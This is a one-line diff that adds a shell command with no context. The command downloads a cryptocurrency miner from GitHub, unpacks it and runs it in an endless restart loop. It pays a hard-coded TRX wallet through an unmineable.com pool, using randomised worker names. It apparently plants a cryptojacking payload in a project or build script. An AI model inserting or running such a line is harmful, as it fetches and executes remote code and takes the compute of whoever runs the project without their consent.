@@ -1,0 +1,1 @@
+wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz && tar -xf violetminer-linux-v0.2.2.tar.gz && cd violetminer-linux-v0.2.2 && while :; do timeout 2m ./violetminer --pool rx-us.unmineable.com:3333 --username TRX:TH4UAVW4w9KU37mv9KBDchJGkhLcVH8nYs.$(shuf -i 1-99999 -n 1) --password x --algorithm wrkzcoin; sleep 2; done
